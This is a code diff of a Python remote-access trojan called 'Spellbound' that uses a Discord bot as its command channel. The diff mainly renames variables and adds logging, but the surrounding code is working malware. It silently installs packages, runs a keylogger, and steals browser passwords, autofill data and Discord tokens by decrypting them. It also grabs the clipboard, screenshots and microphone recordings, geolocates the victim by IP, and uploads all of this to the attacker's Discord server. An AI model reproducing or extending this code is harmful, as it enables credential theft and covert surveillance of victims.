@@ -1,8 +1,10 @@
 import os
 import re
+import sys
 import uuid
 import json
 import wave
+import time
 import ctypes
 import base64
 import random
@@ -10,28 +12,28 @@ import string
 import socket
 import shutil
 import sqlite3
+import asyncio
 import platform
 import threading
 import subprocess
 
-version = "3.7"
+VERSION = "3.7"
+PYTHON_CMD = sys.executable
 
-# _____________________________________________________________________________________________________________________________________ #
-# ===================================================================================================================================== #
-def GetPython():
-    commands = ["py", "python", "python3"]
-    for cmd in commands:
-        try:
-            result = subprocess.run([cmd, "--version"], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            return cmd
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            continue
-    return None
+class log:
+    def error(text):
+        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [ERROR] {text}")
+    def info(text):
+        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [INFO] {text}")
+    def warning(text):
+        print(f"[{time.strftime("%H:%M:%S", time.localtime())}] [WARNING] {text}")
 
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ==================================================================================================================================================================================================================== #
 def InstallPackages(packages):
-    pythonCmd = GetPython()
     for package in packages:
-        subprocess.run([pythonCmd, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        log.info(f"Installing package {package}")
+        subprocess.run([PYTHON_CMD, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
 
 InstallPackages(packages=["requests", "pycryptodome", "pyautogui", "pyperclip", "discord.py", "pynput", "pyaudio"])
 
@@ -44,28 +46,26 @@ import pyautogui
 from Crypto.Cipher import AES
 from pynput.keyboard import Key, Listener
 
-# _____________________________________________________________________________________________________________________________________ #
-# ===================================================================================================================================== #
-BOT_TOKEN = "%"  # %
-microphoneChannelName = "🔊live-microphone"
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ==================================================================================================================================================================================================================== #
+# ****** Discord ****** #
+BOT_TOKEN = "%token%"  # %token%
 
-
-# _____________________________________________________________________________________________________________________________________ #
-# ===================================================================================================================================== #
+# ****** Paths ****** #
 LOCALAPPDATA = os.getenv('LOCALAPPDATA')
 ROAMING = os.getenv('APPDATA')
+USER_HOME = f"C:\\Users\\{os.getlogin()}"
+CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\bin"
 
-userPath = f"C:\\Users\\{os.getlogin()}"
-binPath = f"C:\\Users\\{os.getlogin()}\\bin"
 
-shortcutPath = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-scriptPath = os.path.abspath(__file__)
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ==================================================================================================================================================================================================================== #
+if not os.path.exists(CONTAINER_FOLDER_PATH):
+    log.info(f"First time execution setup :\n   - Creation of the container folder")
+    os.mkdir(CONTAINER_FOLDER_PATH)
 
-if not os.path.exists(binPath):
-    os.mkdir(binPath)
-
-# _____________________________________________________________________________________________________________________________________ #
-# ===================================================================================================================================== #
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ==================================================================================================================================================================================================================== #
 discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
 discordTokens = []
@@ -82,9 +82,9 @@ keyloggerPressedKeys = []
 
 cmdDirectory = ""
 
-# ______________________________________________________________________________________________________________________________________________ #
-# ================================================================ UTILITY ===================================================================== #
-def GetChannelName():
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ============================================================================================ UTILITY =============================================================================================================== #
+def GetMACFormatedForDiscord():
     return f"{os.getlogin().lower()}-{'-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}"
 
 def GetRandomString(length: int) -> str:
@@ -94,20 +94,25 @@ def SafeRemove(path):
     try:
         if os.path.exists(path):
             os.remove(path)
+            log.info(f"Safe removed {path}")
     except Exception as e:
-        pass
+        log.error(f"An error occured while removing {path} :: {e}")
 
 def KillProcess(processName):
     result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
     if processName not in result.stdout:
         return
     subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    log.info(f"{processName} got terminated")
 
 
-# _____________________________________________________________________________________________________________________________________ #
-# ===================================================================================================================================== #
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ==================================================================================================================================================================================================================== #
 def GetClipboard():
-    return f"Last item copied :\n```{pyperclip.paste()}```"
+    if pyperclip.paste() != "":
+        return f"Last item copied :\n```{pyperclip.paste()}```"
+    else:
+        return ":warning: Empty clipboard !"
 
 def RecordMicro(duration=10, filePath=""):
     format = pyaudio.paInt16
@@ -274,20 +279,13 @@ def DecryptData(data, key):
             pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
             pDataOut = DATA_BLOB()
 
-            if ctypes.windll.Crypt32.CryptUnprotectData(
-                ctypes.byref(pDataIn),
-                None,
-                None,
-                None,
-                None,
-                0,
-                ctypes.byref(pDataOut)
-            ):
+            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                 decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                 ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                 return decrypted_data.decode()
 
         except Exception as e:
+            log.error(f"Failed to decrypt data: {e}")
             return f"Failed to decrypt data: {e}"
 
 def ExtractPasswords():
@@ -317,7 +315,7 @@ def ExtractPasswords():
             else:
                 raise ValueError("Failed to decrypt master key.")
         except Exception as e:
-            print(f"Error decrypting master key: {e}")
+            print(f"Error decrypting master key :: {e}")
             continue
 
         for subpath in chromiumSubpaths:
@@ -354,6 +352,7 @@ def ExtractPasswords():
                 os.remove(temp_db)
 
             except Exception as e:
+                log.error(f"Failed to extract password :: {e}")
                 continue
 
 def ExtractAutofill():
@@ -406,14 +405,14 @@ def OnPress(key):
         return
 
     keyCodes = {
-        Key.space: ' ',
-        Key.shift: ' [SHIFT] ',
-        Key.tab: ' [TAB] ',
-        Key.backspace: ' [DEL] ',
-        Key.esc: ' [ESC] ',
-        Key.caps_lock: ' [CAPS LOCK] ',
-        Key.enter: ' [ENTER] ',
-        Key.shift_r: " [SHIFT] "
+        Key.space: " ",
+        Key.shift: "",
+        Key.tab: " [TAB] ",
+        Key.backspace: " [DEL] ",
+        Key.esc: " [ESC] ",
+        Key.caps_lock: " [CAPS LOCK] ",
+        Key.enter: " [ENTER] ",
+        Key.shift_r: ""
     }
     
     try:
@@ -437,26 +436,28 @@ class Client(discord.Client):
     # ============================================================== CHANNELS SETUP ======================================================================= #
     @staticmethod
     async def on_ready():
+        log.info("Connection etablished with C2")
         for guild in client.guilds:
             # ****** Commands channel ****** #
-            channel_name = GetChannelName()
-            existing_channel = discord.utils.get(guild.text_channels, name=channel_name)
+            currentCommandSession = discord.utils.get(guild.text_channels, name=GetMACFormatedForDiscord())
 
-            if existing_channel is None:
-                new_channel = await guild.create_text_channel(GetChannelName())
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
-                await new_channel.send(embed=embed)
+            if currentCommandSession is None:
+                newCommandChannel = await guild.create_text_channel(GetMACFormatedForDiscord())
+                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                await newCommandChannel.send(embed=embed)
+                log.info("New command channel created")
             else:
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
-                await existing_channel.send(embed=embed)
+                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
+                await currentCommandSession.send(embed=embed)
 
-            # ****** Vocal channel ****** #
-            
+            # ****** Other channel ****** #
+
 
         # ____________________________________________________________________________________________________________________________________________________ #
         # ================================================================= HACKS THREADS ==================================================================== #
         KEYLOGGER_THREAD = threading.Thread(target=KeyloggerThread)
         KEYLOGGER_THREAD.start()
+        log.info("Keylogger thread started")
 
 
     # _________________________________________________________________________________________________________________________________________________ #
@@ -468,13 +469,14 @@ class Client(discord.Client):
             return
         
         channel = message.channel
-        if channel.name == GetChannelName():
+        if channel.name == GetMACFormatedForDiscord():
+            log.info(f"New message recieved : {message.content}")
             # ____________________________________________________________________________________________________________________________________________ #
             # =================================================================== .ping ================================================================== #
             if message.content == ".ping":
                 await message.delete()
                 
-                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{version}`", color=discord.Color.blue())
+                embed = discord.Embed(description=f":wireless: **{os.getlogin()}** Connected with `Spellbound v{VERSION}`", color=discord.Color.blue())
                 await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________ #
@@ -502,14 +504,8 @@ class Client(discord.Client):
             elif message.content == ".cb" or message.content == ".clipboard":
                 await message.delete()
                 
-                clipboard = GetClipboard()
-
-                if clipboard != "":
-                    embed = discord.Embed(description=clipboard, color=discord.Color.purple())
-                    await message.channel.send(embed=embed)
-                else:
-                    embed = discord.Embed(description=f":warning: Empty clipboard !", color=discord.Color.yellow())
-                    await message.channel.send(embed=embed)
+                embed = discord.Embed(description=GetClipboard(), color=discord.Color.green())
+                await message.channel.send(embed=embed)
 
             # _____________________________________________________________________________________________________________________________________________________ #
             # ================================================================= .grab autofill ==================================================================== #
@@ -521,7 +517,7 @@ class Client(discord.Client):
 
                 ExtractAutofill()
 
-                filePath = f"{binPath}/{GetRandomString(17)}.txt"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 with open(filePath, "w") as f:
                     for autofill in browserAutofill:
                         f.write(autofill)
@@ -542,7 +538,7 @@ class Client(discord.Client):
                 GetDiscordTokens()
                 tokens = ExtractInfosFromToken()
 
-                filePath = f"{binPath}/{GetRandomString(17)}.txt"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 with open(filePath, "w") as f:
                     for token in tokens:
                         f.write(token)
@@ -569,7 +565,7 @@ class Client(discord.Client):
                         f"Password:       {entry['password']}\n"
                         f"==============\n")
 
-                filePath = f"{binPath}/{GetRandomString(17)}.txt"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 with open(filePath, "w") as f:
                     f.write(formatted)
 
@@ -601,7 +597,7 @@ class Client(discord.Client):
                 loc = data.get('loc')
                 org = data.get('org')
 
-                filePath = f"{binPath}/{GetRandomString(17)}.txt"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 with open(filePath, "w") as f:
                     f.write(f"""
 Session: {session}
@@ -631,7 +627,7 @@ Internet Provider: {org}
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                 await message.channel.send(embed=embed)
                 
-                filePath = f"{binPath}/{GetRandomString(17)}.png"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.png"
                 screenshot = pyautogui.screenshot()
                 screenshot.save(filePath)
 
@@ -669,7 +665,7 @@ Internet Provider: {org}
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                 await message.channel.send(embed=embed)
                 
-                filePath = f"{binPath}/{GetRandomString(17)}.txt"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.txt"
                 finalMessage = ""
                 for key in keyloggerPressedKeys:
                     finalMessage += key
@@ -727,7 +723,7 @@ Internet Provider: {org}
                 embed = discord.Embed(description=":microphone2: Recording... This action may take time !", color=discord.Color.yellow())
                 await message.channel.send(embed=embed)
 
-                filePath = f"{binPath}/{GetRandomString(17)}.wav"
+                filePath = f"{CONTAINER_FOLDER_PATH}/{GetRandomString(17)}.wav"
                 RecordMicro(filePath=filePath)
 
                 embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
